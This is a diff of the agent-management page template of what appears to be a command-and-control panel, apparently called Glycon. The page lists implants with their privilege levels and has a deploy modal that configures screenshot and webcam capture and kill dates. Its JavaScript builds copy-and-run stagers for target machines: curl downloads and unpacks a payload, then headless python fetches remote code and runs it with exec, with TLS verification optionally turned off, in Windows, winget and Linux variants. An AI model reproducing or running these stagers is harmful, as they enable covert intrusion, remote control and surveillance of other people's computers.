@@ -1,82 +1,106 @@
 {% extends "base.html" %}
+{% from "macros.html" import icon, status_badge, priv_badge %}
 
 {% block title %}Agents{% endblock %}
 
-{% block head %}
-{{ super() }}
-<script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
-{% endblock %}
-
 {% block content %}
-<h2 class="mb-4">Connected Agents</h2>
-
-<div class="card mb-4">
-    <div class="card-header d-flex justify-content-between align-items-center">
-        <h5 class="mb-0">Agent List</h5>
+<div class="space-y-6">
+    <!-- Header -->
+    <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
         <div>
-            <button class="btn btn-sm btn-outline-secondary me-2" id="manualRefresh" title="Refresh list">
-                <i class="bi bi-arrow-clockwise"></i> Refresh
+            <h1 class="text-2xl font-bold tracking-tight text-slate-100">Connected Agents</h1>
+            <p class="text-sm text-slate-400 mt-0.5">Monitor active implants, manage sessions, and generate deployment payloads</p>
+        </div>
+        <div class="flex items-center gap-2.5">
+            <button type="button" id="manualRefresh" class="tactical-btn-secondary" title="Refresh agent list">
+                {{ icon('refresh', 'w-4 h-4') }}
+                <span>Refresh</span>
             </button>
-            <button class="btn btn-sm btn-success" title="Deploy new agent" data-bs-toggle="modal" data-bs-target="#deployAgentModal">
-                <i class="bi bi-plus-circle"></i> Deploy Agent
+            <button type="button" class="tactical-btn-primary" data-modal-target="#deployAgentModal">
+                {{ icon('plus', 'w-4 h-4') }}
+                <span>Deploy Agent</span>
             </button>
         </div>
     </div>
-    <div class="card-body">
-        <div class="table-responsive">
-            <table class="table table-hover" id="agentsTable">
+
+    <!-- Agents Table Card -->
+    <div class="tactical-card">
+        <div class="tactical-card-header flex-col sm:flex-row items-stretch sm:items-center">
+            <div class="flex items-center gap-2.5">
+                <span class="text-emerald-400">{{ icon('agents', 'w-5 h-5') }}</span>
+                <h2 class="text-base font-semibold text-slate-100">Active Fleet</h2>
+                <span class="px-2 py-0.5 text-xs font-mono rounded-full bg-slate-800 text-slate-300 border border-slate-700">{{ agents|length }}</span>
+            </div>
+            <div class="relative w-full sm:w-64">
+                <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-slate-500 pointer-events-none">
+                    {{ icon('search', 'w-4 h-4') }}
+                </span>
+                <input type="text" id="agentSearchInput" placeholder="Filter by hostname, IP, OS..."
+                       class="tactical-input pl-9 py-1.5 text-xs">
+            </div>
+        </div>
+
+        <div class="overflow-x-auto">
+            <table class="tactical-table" id="agentsTable">
                 <thead>
                     <tr>
                         <th>ID</th>
                         <th>Hostname</th>
-                        <th>Priv</th>
-                        <th>IP</th>
-                        <th>OS</th>
+                        <th>Privilege</th>
+                        <th>IP Address</th>
+                        <th>Operating System</th>
                         <th>Last Seen</th>
-                        <th>KillDate</th>
+                        <th>Kill Date</th>
                         <th>Status</th>
-                        <th>Actions</th>
+                        <th class="text-right">Actions</th>
                     </tr>
                 </thead>
                 <tbody id="agentsTableBody">
                     {% for agent in agents %}
                     <tr class="{% if agent.status == 'online' %}agent-online{% elif agent.status == 'inactive' %}agent-inactive{% else %}agent-offline{% endif %}" id="agent-{{ agent.id }}">
-                        <td>{{ agent.id[:8] }}...</td>
-                        <td><a href="{{ base_url }}{{ url_for('agent_detail', agent_id=agent.id) }}">{{ agent.hostname }}</a></td>
-                        <td>
-                            {% if agent.privilege.lower() == 'system' %}
-                                <i class="bi bi-shield-fill-check text-danger" title="SYSTEM Privileges"></i>
-                            {% elif agent.privilege.lower() == 'admin' %}
-                                <i class="bi bi-shield-check text-warning" title="Administrative Privileges"></i>
-                            {% else %}
-                                <i class="bi bi-person text-secondary" title="User Privileges"></i>
-                            {% endif %}
+                        <td class="font-mono text-xs text-slate-400">{{ agent.id[:8] }}...</td>
+                        <td class="font-semibold">
+                            <a href="{{ base_url }}{{ url_for('agent_detail', agent_id=agent.id) }}" class="text-slate-100 hover:text-emerald-400 transition-colors">
+                                {{ agent.hostname }}
+                            </a>
                         </td>
-                        <td>{{ agent.ip }}</td>
-                        <td>{{ agent.os }}</td>
-                        <td>{{ agent.last_seen }}</td>
-                        <td>{{ agent.killdate }}</td>
-                       <td>
-                        <span class="badge bg-{% if agent.status == 'online' %}success{% elif agent.status == 'inactive' %}warning{% else %}danger{% endif %} rounded-pill">
-                            <i class="bi bi-{% if agent.status == 'online' %}check-circle{% elif agent.status == 'inactive' %}exclamation-circle{% else %}x-circle{% endif %} me-1"></i>
-                            {{ agent.status|capitalize }}
-                        </span>
-                    </td>
-                        <td>
-                            <div class="d-flex gap-1">
+                        <td>{{ priv_badge(agent.privilege) }}</td>
+                        <td class="font-mono text-xs text-slate-300">{{ agent.ip }}</td>
+                        <td class="text-xs text-slate-300">{{ agent.os }}</td>
+                        <td class="font-mono text-xs text-slate-400">{{ agent.last_seen }}</td>
+                        <td class="font-mono text-xs text-slate-400">{{ agent.killdate or '-' }}</td>
+                        <td>{{ status_badge(agent.status) }}</td>
+                        <td class="text-right">
+                            <div class="inline-flex items-center justify-end gap-1.5">
                                 <a href="{{ base_url }}{{ url_for('agent_detail', agent_id=agent.id) }}"
-                                   class="btn btn-sm btn-icon btn-outline-primary" title="View details">
-                                    <i class="bi bi-info-circle"></i>
+                                   class="p-1.5 rounded-lg bg-slate-800/80 text-cyan-400 hover:bg-cyan-500/20 border border-slate-700/80 hover:border-cyan-500/40 transition-colors"
+                                   title="Agent Details & Tasks">
+                                    {{ icon('info', 'w-4 h-4') }}
                                 </a>
                                 <a href="{{ base_url }}{{ url_for('terminal', agent_id=agent.id) }}"
-                                   class="btn btn-sm btn-icon btn-outline-success" title="Open terminal">
-                                    <i class="bi bi-terminal"></i>
+                                   class="p-1.5 rounded-lg bg-slate-800/80 text-emerald-400 hover:bg-emerald-500/20 border border-slate-700/80 hover:border-emerald-500/40 transition-colors"
+                                   title="Interactive Terminal">
+                                    {{ icon('terminal', 'w-4 h-4') }}
                                 </a>
-                                <button class="btn btn-sm btn-icon btn-outline-danger delete-agent"
-                                        data-agent-id="{{ agent.id }}" title="Delete agent">
-                                    <i class="bi bi-x-circle"></i>
+                                <a href="{{ base_url }}{{ url_for('remote_desktop', agent_id=agent.id) }}"
+                                   class="p-1.5 rounded-lg bg-slate-800/80 text-slate-300 hover:text-white hover:bg-slate-700 border border-slate-700/80 transition-colors"
+                                   title="Remote Desktop">
+                                    {{ icon('desktop', 'w-4 h-4') }}
+                                </a>
+                                <button type="button"
+                                        class="p-1.5 rounded-lg bg-slate-800/80 text-rose-400 hover:bg-rose-500/20 border border-slate-700/80 hover:border-rose-500/40 transition-colors delete-agent"
+                                        data-agent-id="{{ agent.id }}"
+                                        data-agent-hostname="{{ agent.hostname }}"
+                                        title="Delete Agent">
+                                    {{ icon('trash', 'w-4 h-4') }}
                                 </button>
                             </div>
+                        </td>
+                    </tr>
+                    {% else %}
+                    <tr>
+                        <td colspan="9" class="text-center py-10 text-slate-500">
+                            No agents connected yet. Click <strong class="text-slate-300">Deploy Agent</strong> to generate a payload.
                         </td>
                     </tr>
                     {% endfor %}
@@ -87,134 +111,119 @@
 </div>
 
 <!-- Deploy Agent Modal -->
-<div class="modal fade" id="deployAgentModal" tabindex="-1" aria-labelledby="deployAgentModalLabel" aria-hidden="true">
-    <div class="modal-dialog modal-lg">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h5 class="modal-title" id="deployAgentModalLabel">Deploy New Agent</h5>
-                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+<div id="deployAgentModal" class="glycon-modal modal fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm overflow-y-auto" tabindex="-1" aria-hidden="true">
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-w-3xl w-full overflow-hidden my-8">
+        <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
+            <div class="flex items-center gap-2.5">
+                <span class="text-emerald-400">{{ icon('agents', 'w-5 h-5') }}</span>
+                <h3 class="text-base font-semibold text-slate-100" id="deployAgentModalLabel">Deploy New Agent Payload</h3>
             </div>
-            <div class="modal-body">
-                <form id="agentConfigForm">
-                    <div class="row mb-3">
-                        <div class="col-md-6">
-                            <label class="form-label">Check-in Interval (seconds)</label>
-                            <input type="number" class="form-control" id="checkinInterval" value="{{ agent_config.checkin_interval if agent_config else 10 }}" min="5" max="3600" required>
-                        </div>
-                        <div class="col-md-6">
-                            <label class="form-label">Server URL</label>
-                            <input type="url" class="form-control" id="serverUrl" 
-                                   value="{{ agent_config.server_url if agent_config else (request.url_root | replace('http://', 'https://')) }}" required>
-                        </div>
-                    </div>
-                    <div class="row mb-3">
-                        <div class="col-md-6">
-                            <div class="form-check">
-                                <input class="form-check-input" type="checkbox" id="takeScreenshots" {% if agent_config and agent_config.take_screenshots %}checked{% endif %}>
-                                <label class="form-check-label" for="takeScreenshots">Take Screenshots</label>
-                            </div>
-                        </div>
-                        <div class="col-md-6">
-                            <label class="form-label">Screenshot Frequency</label>
-                            <select class="form-select" id="screenshotFrequency">
-                                <option value="1" {% if agent_config and agent_config.screenshot_frequency == 1 %}selected{% endif %}>Every check-in</option>
-                                <option value="5" {% if agent_config and agent_config.screenshot_frequency == 5 %}selected{% endif %}>Every 5 check-ins</option>
-                                <option value="10" {% if not agent_config or agent_config.screenshot_frequency == 10 %}selected{% endif %}>Every 10 check-ins</option>
-                                <option value="30" {% if agent_config and agent_config.screenshot_frequency == 30 %}selected{% endif %}>Every 30 check-ins</option>
-                            </select>
-                        </div>
-                    </div>
-                    <div class="row mb-3">
-                        <div class="col-md-6">
-                            <div class="form-check">
-                                <input class="form-check-input" type="checkbox" id="takeWebcam" {% if agent_config and agent_config.take_webcam %}checked{% endif %}>
-                                <label class="form-check-label" for="takeWebcam">Take Webcam</label>
-                            </div>
-                        </div>
-                        <div class="col-md-6">
-                            <label class="form-label">Webcam Frequency</label>
-                            <select class="form-select" id="webcamFrequency">
-                                <option value="1" {% if agent_config and agent_config.webcam_frequency == 1 %}selected{% endif %}>Every check-in</option>
-                                <option value="5" {% if agent_config and agent_config.webcam_frequency == 5 %}selected{% endif %}>Every 5 check-ins</option>
-                                <option value="10" {% if not agent_config or agent_config.webcam_frequency == 10 %}selected{% endif %}>Every 10 check-ins</option>
-                                <option value="30" {% if agent_config and agent_config.webcam_frequency == 30 %}selected{% endif %}>Every 30 check-ins</option>
-                            </select>
-                        </div>
-                    </div>
-                    <div class="row mb-3">
-                        <div class="col-md-6">
-                            <label class="form-label">Kill Date</label>
-                            <input type="datetime-local" class="form-control" id="killDate" value="{{ agent_config.killdate|replace(' ', 'T') if agent_config and agent_config.killdate else '' }}">
-                            <small class="text-muted">Agent will self-destruct after this date/time</small>
-                        </div>
-                        <div class="col-md-6">
-                            <div class="form-check mt-4 pt-3">
-                                <input class="form-check-input" type="checkbox" id="enableKillDate" {% if agent_config and agent_config.killdate_enabled %}checked{% endif %}>
-                                <label class="form-check-label" for="enableKillDate">Enable Kill Date</label>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="row mb-3">
-                        <div class="col-md-6">
-                            <div class="form-check">
-                                <input class="form-check-input" type="checkbox" id="trustedCertificate" {% if agent_config and agent_config.trusted_certificate %}checked{% endif %}>
-                                <label class="form-check-label" for="trustedCertificate">Trusted Certificate</label>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="d-grid gap-2">
-                        <button type="submit" class="btn btn-primary">Generate Agent</button>
-                    </div>
-                </form>
+            <button type="button" data-modal-close class="text-slate-400 hover:text-slate-100 p-1.5 rounded-lg hover:bg-slate-800">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
 
-                <div id="agentDownload" class="mt-4" style="display: none;">
-                    <div class="d-flex justify-content-between align-items-center mb-3">
-                        <h5>Agent Deployment</h5>
-                        <a id="downloadLink" href="#" class="btn btn-success">
-                            <i class="bi bi-download me-2"></i>Download Agent
-                        </a>
+        <div class="p-6 max-h-[80vh] overflow-y-auto">
+            <form id="agentConfigForm" class="space-y-5">
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div>
+                        <label for="checkinInterval" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Check-in Interval (seconds)</label>
+                        <input type="number" id="checkinInterval" class="tactical-input font-mono"
+                               value="{{ agent_config.checkin_interval if agent_config else 10 }}" min="5" max="3600" required>
                     </div>
-                    
-                    <div class="mb-2">
-                        <b>Or copy and run on target:</b>
-                    </div>
-                    
-                    <div id="displayArea" class="command-display mt-2" style="
-                        background-color: #1e1e1e;
-                        border-radius: 5px;
-                        padding: 15px;
-                        position: relative;
-                        font-family: 'Consolas', 'Monaco', monospace;
-                        color: #d4d4d4;
-                        border-left: 4px solid #569cd6;
-                        overflow-x: auto;
-                        white-space: nowrap;
-                    ">
-                        <!-- Command will be inserted here -->
-                        <button id="copyButton" class="btn btn-sm btn-secondary" style="
-                            position: absolute;
-                            top: 5px;
-                            right: 5px;
-                            padding: 2px 8px;
-                            font-size: 12px;
-                            opacity: 0.8;
-                        ">
-                            <i class="bi bi-clipboard"></i> Copy
-                        </button>
+                    <div>
+                        <label for="serverUrl" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">C2 Server URL</label>
+                        <input type="url" id="serverUrl" class="tactical-input font-mono"
+                               value="{{ agent_config.server_url if agent_config else (request.url_root | replace('http://', 'https://')) }}" required>
                     </div>
                 </div>
 
-                <div id="agentError" class="alert alert-danger mt-3" style="display: none;"></div>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 p-4 rounded-xl bg-slate-950/60 border border-slate-800/80">
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="takeScreenshots" class="w-4 h-4 rounded bg-slate-900 border-slate-700 text-emerald-500 focus:ring-emerald-500/30"
+                               {% if agent_config and agent_config.take_screenshots %}checked{% endif %}>
+                        <label for="takeScreenshots" class="text-sm font-medium text-slate-200">Automated Screenshots</label>
+                    </div>
+                    <div>
+                        <label for="screenshotFrequency" class="block text-xs font-medium text-slate-400 mb-1">Screenshot Frequency</label>
+                        <select id="screenshotFrequency" class="tactical-select w-full">
+                            <option value="1" {% if agent_config and agent_config.screenshot_frequency == 1 %}selected{% endif %}>Every check-in</option>
+                            <option value="5" {% if agent_config and agent_config.screenshot_frequency == 5 %}selected{% endif %}>Every 5 check-ins</option>
+                            <option value="10" {% if not agent_config or agent_config.screenshot_frequency == 10 %}selected{% endif %}>Every 10 check-ins</option>
+                            <option value="30" {% if agent_config and agent_config.screenshot_frequency == 30 %}selected{% endif %}>Every 30 check-ins</option>
+                        </select>
+                    </div>
+
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="takeWebcam" class="w-4 h-4 rounded bg-slate-900 border-slate-700 text-emerald-500 focus:ring-emerald-500/30"
+                               {% if agent_config and agent_config.take_webcam %}checked{% endif %}>
+                        <label for="takeWebcam" class="text-sm font-medium text-slate-200">Automated Webcam Capture</label>
+                    </div>
+                    <div>
+                        <label for="webcamFrequency" class="block text-xs font-medium text-slate-400 mb-1">Webcam Frequency</label>
+                        <select id="webcamFrequency" class="tactical-select w-full">
+                            <option value="1" {% if agent_config and agent_config.webcam_frequency == 1 %}selected{% endif %}>Every check-in</option>
+                            <option value="5" {% if agent_config and agent_config.webcam_frequency == 5 %}selected{% endif %}>Every 5 check-ins</option>
+                            <option value="10" {% if not agent_config or agent_config.webcam_frequency == 10 %}selected{% endif %}>Every 10 check-ins</option>
+                            <option value="30" {% if agent_config and agent_config.webcam_frequency == 30 %}selected{% endif %}>Every 30 check-ins</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div>
+                        <label for="killDate" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Kill Date (Self-Destruct)</label>
+                        <input type="datetime-local" id="killDate" class="tactical-input font-mono"
+                               value="{{ agent_config.killdate|replace(' ', 'T') if agent_config and agent_config.killdate else '' }}">
+                        <p class="text-[11px] text-slate-500 mt-1">Agent terminates automatically after this timestamp</p>
+                    </div>
+                    <div class="flex flex-col justify-center gap-3 pt-2">
+                        <label class="inline-flex items-center gap-2.5 cursor-pointer">
+                            <input type="checkbox" id="enableKillDate" class="w-4 h-4 rounded bg-slate-900 border-slate-700 text-emerald-500 focus:ring-emerald-500/30"
+                                   {% if agent_config and agent_config.killdate_enabled %}checked{% endif %}>
+                            <span class="text-sm text-slate-200">Enable Kill Date</span>
+                        </label>
+                        <label class="inline-flex items-center gap-2.5 cursor-pointer">
+                            <input type="checkbox" id="trustedCertificate" class="w-4 h-4 rounded bg-slate-900 border-slate-700 text-emerald-500 focus:ring-emerald-500/30"
+                                   {% if agent_config and agent_config.trusted_certificate %}checked{% endif %}>
+                            <span class="text-sm text-slate-200">Verify TLS Certificate (Trusted CA)</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="pt-2">
+                    <button type="submit" class="tactical-btn-primary w-full py-2.5">
+                        {{ icon('tools', 'w-4 h-4') }}
+                        <span>Generate Agent & Stagers</span>
+                    </button>
+                </div>
+            </form>
+
+            <!-- Deployment Stagers Output -->
+            <div id="agentDownload" class="mt-6 pt-6 border-t border-slate-800" style="display: none;">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-4">
+                    <div>
+                        <h4 class="text-sm font-semibold text-emerald-400">Payload Compiled Successfully</h4>
+                        <p class="text-xs text-slate-400">Download standalone script or execute a one-liner stager on target</p>
+                    </div>
+                    <a id="downloadLink" href="#" class="tactical-btn-primary">
+                        {{ icon('download', 'w-4 h-4') }}
+                        <span>Download Agent (.py)</span>
+                    </a>
+                </div>
+
+                <div id="displayArea" class="space-y-3 text-xs font-mono"></div>
             </div>
+
+            <div id="agentError" class="mt-4 px-4 py-3 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-sm" style="display: none;"></div>
         </div>
     </div>
 </div>
+{% endblock %}
 
-
+{% block extra_js %}
 <script>
-    // Initialize Socket.IO connection
     let socket;
-    
     try {
         socket = io("{{ request.url_root }}", {
             reconnection: true,
@@ -222,186 +231,122 @@
             reconnectionDelay: 1000,
             transports: ['websocket']
         });
-        
-        socket.on('connect', () => {
-            console.log('Connected to WebSocket server');
-        });
-        
-        socket.on('connect_error', (err) => {
-            console.error('WebSocket connection error:', err);
-        });
-        
-        // Event handlers
+
         socket.on('agent_deleted', function(data) {
             const agentRow = document.getElementById(`agent-${data.agent_id}`);
             if (agentRow) {
                 agentRow.remove();
-                showToast('Agent Deleted', `Agent ${data.agent_id} was deleted`, 'danger');
+                GlyconUI.toast('Agent Deleted', `Agent ${data.agent_id} was removed`, 'danger');
             }
         });
-        
+
         socket.on('agent_dead', function(data) {
             const agentRow = document.getElementById(`agent-${data.agent_id}`);
             if (agentRow) {
                 agentRow.classList.remove('agent-online');
                 agentRow.classList.add('agent-offline');
-                
                 const statusBadge = agentRow.querySelector('.badge');
                 if (statusBadge) {
-                    statusBadge.className = 'badge bg-danger rounded-pill';
-                    statusBadge.innerHTML = '<i class="bi bi-x-circle me-1"></i>Dead';
+                    statusBadge.className = 'badge inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium bg-rose-500/15 text-rose-400 border border-rose-500/30';
+                    statusBadge.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-rose-400"></span>Dead';
                 }
-                showToast('Agent Terminated', data.message, 'warning');
+                GlyconUI.toast('Agent Terminated', data.message, 'warning');
             }
         });
-        
+
         socket.on('new_agent', function(data) {
             refreshAgentList();
-            showToast('New Agent', `New agent ${data.agent_id} connected`, 'success');
+            GlyconUI.toast('New Agent Connected', `Beacon ${data.agent_id} checked in`, 'success');
         });
-        
+
         socket.on('new_task', function(data) {
             if (data.agent_id) {
-                showToast('Task Created', `New task for agent ${data.agent_id}`, 'info');
+                GlyconUI.toast('Task Queued', `New task queued for ${data.agent_id}`, 'info');
             }
         });
-        
+
         socket.on('task_complete', function(data) {
             if (data.agent_id) {
-                showToast('Task Completed', `Task completed for agent ${data.agent_id}`, 'success');
+                GlyconUI.toast('Task Completed', `Task completed on ${data.agent_id}`, 'success');
             }
         });
-        
     } catch (err) {
         console.error('Socket.IO initialization error:', err);
     }
 
+    function applyAgentSearchFilter() {
+        const q = (document.getElementById('agentSearchInput')?.value || '').toLowerCase().trim();
+        document.querySelectorAll('#agentsTableBody tr[id^="agent-"]').forEach(row => {
+            row.style.display = (!q || row.textContent.toLowerCase().includes(q)) ? '' : 'none';
+        });
+    }
+
+    document.getElementById('agentSearchInput')?.addEventListener('input', applyAgentSearchFilter);
+
     function refreshAgentList() {
         fetch(window.location.href, {
-            headers: {
-                'X-Requested-With': 'XMLHttpRequest'
-            }
+            headers: { 'X-Requested-With': 'XMLHttpRequest' }
         })
         .then(response => response.text())
         .then(html => {
             const parser = new DOMParser();
             const newDoc = parser.parseFromString(html, 'text/html');
-            document.getElementById('agentsTableBody').innerHTML = 
-                newDoc.getElementById('agentsTableBody').innerHTML;
+            const nextBody = newDoc.getElementById('agentsTableBody');
+            if (nextBody) {
+                document.getElementById('agentsTableBody').innerHTML = nextBody.innerHTML;
+                applyAgentSearchFilter();
+            }
         })
         .catch(error => console.error('Error refreshing agent list:', error));
     }
 
-    // Delete agent handler
-    document.addEventListener('click', function(e) {
-        if (e.target.closest('.delete-agent')) {
-            const agentId = e.target.closest('.delete-agent').dataset.agentId;
-            if (confirm(`Are you sure you want to delete agent ${agentId}? This action cannot be undone.`)) {
-                fetch(`/api/agents/${agentId}`, {
-                    method: 'DELETE',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                })
-                .then(response => {
-                    if (response.ok) {
-                        return response.json();
-                    }
-                    throw new Error('Failed to delete agent');
-                })
-                .then(data => {
-                    if (data.status === 'success') {
-                        document.getElementById(`agent-${agentId}`)?.remove();
-                        showToast('Success', `Agent ${agentId} deleted`, 'success');
-                    } else {
-                        showToast('Error', data.message || 'Error deleting agent', 'danger');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    showToast('Error', 'Failed to delete agent', 'danger');
-                });
+    // Delete agent handler with modern Promise confirm modal
+    document.addEventListener('click', async function(e) {
+        const delBtn = e.target.closest('.delete-agent');
+        if (!delBtn) return;
+
+        const agentId = delBtn.dataset.agentId;
+        const hostname = delBtn.dataset.agentHostname || agentId;
+        const confirmed = await GlyconUI.confirm({
+            title: 'Delete Agent Record',
+            message: `Are you sure you want to permanently remove agent "${hostname}" (${agentId})? This action cannot be undone.`,
+            confirmText: 'Delete Agent',
+            variant: 'danger'
+        });
+
+        if (!confirmed) return;
+
+        try {
+            const response = await fetch(`/api/agents/${agentId}`, {
+                method: 'DELETE',
+                headers: { 'Content-Type': 'application/json' }
+            });
+            const data = await response.json();
+            if (response.ok && data.status === 'success') {
+                document.getElementById(`agent-${agentId}`)?.remove();
+                GlyconUI.toast('Agent Deleted', `Agent ${hostname} deleted`, 'success');
+            } else {
+                GlyconUI.toast('Delete Failed', data.message || 'Error deleting agent', 'danger');
             }
+        } catch (error) {
+            console.error('Error:', error);
+            GlyconUI.toast('Delete Failed', 'Failed to delete agent', 'danger');
         }
     });
 
-    // Toast notification system
-    function showToast(title, message, type, html = false) {
-        const toastContainer = document.getElementById('toastContainer') || createToastContainer();
-        const toastId = 'toast-' + Date.now();
-        
-        const toastEl = document.createElement('div');
-        toastEl.className = `toast align-items-center text-bg-${type} border-0`;
-        toastEl.setAttribute('role', 'alert');
-        toastEl.setAttribute('aria-live', 'assertive');
-        toastEl.setAttribute('aria-atomic', 'true');
-        toastEl.id = toastId;
-        
-        toastEl.innerHTML = `
-            <div class="d-flex">
-                <div class="toast-body">
-                    <strong>${title}</strong><br>
-                    ${html ? message : escapeHtml(message)}
-                </div>
-                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
-            </div>
-        `;
-        
-        toastContainer.appendChild(toastEl);
-        const toast = new bootstrap.Toast(toastEl);
-        toast.show();
-        
-        toastEl.addEventListener('hidden.bs.toast', function() {
-            toastEl.remove();
-        });
-    }
-    
-    function createToastContainer() {
-        const container = document.createElement('div');
-        container.id = 'toastContainer';
-        container.className = 'position-fixed bottom-0 end-0 p-3';
-        container.style.zIndex = '11';
-        document.body.appendChild(container);
-        return container;
-    }
-    
-    function escapeHtml(unsafe) {
-        return unsafe
-            .replace(/&/g, "&amp;")
-            .replace(/</g, "&lt;")
-            .replace(/>/g, "&gt;")
-            .replace(/"/g, "&quot;")
-            .replace(/'/g, "&#039;");
-    }
-
-    // Refresh every 5 seconds
     let refreshInterval = setInterval(refreshAgentList, 5000);
-
-    // Manual refresh button
-    document.getElementById('manualRefresh').addEventListener('click', function() {
+    document.getElementById('manualRefresh').addEventListener('click', () => {
         refreshAgentList();
+        GlyconUI.toast('Refreshed', 'Agent list updated', 'info', 2000);
     });
-
-    // Pause refresh when window loses focus
-    window.addEventListener('blur', function() {
+    window.addEventListener('blur', () => clearInterval(refreshInterval));
+    window.addEventListener('focus', () => {
         clearInterval(refreshInterval);
-    });
-
-    // Resume refresh when window regains focus
-    window.addEventListener('focus', function() {
         refreshInterval = setInterval(refreshAgentList, 5000);
         refreshAgentList();
     });
 
-    // Initialize tooltips and agent deployment functionality
     document.addEventListener('DOMContentLoaded', function() {
-        // Initialize tooltips
-        const tooltipTriggerList = [].slice.call(document.querySelectorAll('[title]'));
-        tooltipTriggerList.map(function(tooltipTriggerEl) {
-            return new bootstrap.Tooltip(tooltipTriggerEl);
-        });
-
-        // Agent deployment functionality
         const form = document.getElementById('agentConfigForm');
         const downloadDiv = document.getElementById('agentDownload');
         const downloadLink = document.getElementById('downloadLink');
@@ -410,16 +355,14 @@
         const killDateInput = document.getElementById('killDate');
         const trustedCertificate = document.getElementById('trustedCertificate');
 
-        // Toggle kill date input
         enableKillDate.addEventListener('change', function() {
             killDateInput.disabled = !this.checked;
         });
 
-        // Form submission - prevent default and handle manually
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             errorDiv.style.display = 'none';
-            
+
             const config = {
                 checkin_interval: document.getElementById('checkinInterval').value,
                 server_url: document.getElementById('serverUrl').value,
@@ -435,203 +378,78 @@
             try {
                 const response = await fetch('/api/generate_agent', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(config)
                 });
-
                 const data = await response.json();
-                
                 if (!response.ok) {
                     throw new Error(data.message || 'Failed to generate agent');
                 }
 
-                // Update download link with cache-busting timestamp
                 downloadLink.href = `/a/d?t=${Date.now()}`;
-                
-                // Generate and display the command
                 generateCommand(config.server_url, config.enable_killdate, config.killdate, config.trusted_certificate);
-                
-                // Show download section
                 downloadDiv.style.display = 'block';
-                
+                GlyconUI.toast('Agent Compiled', 'Deployment stagers ready', 'success');
             } catch (error) {
-                console.error('Error:', error);
                 errorDiv.textContent = error.message;
                 errorDiv.style.display = 'block';
             }
         });
 
-        // Trusted certificate checkbox change handler
         trustedCertificate.addEventListener('change', function() {
-            // Only update if download section is visible
             if (downloadDiv.style.display === 'block') {
-                const url = document.getElementById('serverUrl').value;
-                const enableKillDate = document.getElementById('enableKillDate').checked;
-                const killDate = document.getElementById('killDate').value;
-                generateCommand(url, enableKillDate, killDate, this.checked);
+                generateCommand(
+                    document.getElementById('serverUrl').value,
+                    enableKillDate.checked,
+                    killDateInput.value,
+                    this.checked
+                );
             }
         });
 
-        // Generate command function
         function generateCommand(url, enableKillDate, killDate, trustedCert) {
-            // Format kill date for display if enabled
-            let killDateDisplay = '';
-            if (enableKillDate && killDate) {
-                const dateObj = new Date(killDate);
-                const formattedDate = dateObj.toISOString().replace('T', ' ').substring(0, 16);
-                killDateDisplay = `\n<span style="color: #569cd6;"># Kill Date:</span> <span style="color: #ce9178;">${formattedDate}</span>`;
-            }
-
-            // Create the command based on trusted certificate setting
-            let command;
-            let command2;
             const curlOption = trustedCert ? '-s' : '-ks';
-            const pythonCode = trustedCert ? 
-                `"import urllib3;import requests;url='${url}/a/d';exec(requests.get(url).text)"` :
-                `"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
-            
-            command = `curl ${curlOption} ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c ${pythonCode}`;
-            
-            command2 = trustedCert ?
-                `winget install --accept-package-agreements --accept-source-agreements  --disable-interactivity -s msstore 9NCVDN91XZQP >NUL & start /b conhost --headless pip install requests urllib3 & timeout 10 > NUL& start /b conhost --headless python -c "import requests; url='${url}/a/d'; exec(requests.get(url).text)"` :
-                `winget install --accept-package-agreements --accept-source-agreements  --disable-interactivity -s msstore 9NCVDN91XZQP >NUL & start /b conhost --headless pip install requests urllib3 & timeout 10 > NUL& start /b conhost --headless  python -c "import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); import requests; url='${url}/a/d'; exec(requests.get(url, verify=False).text)"`;
+            const pythonCode = trustedCert
+                ? `"import urllib3;import requests;url='${url}/a/d';exec(requests.get(url).text)"`
+                : `"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
 
-            let nixPythonCode = `"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
-            let command3 = `python3 -c ${nixPythonCode}`;
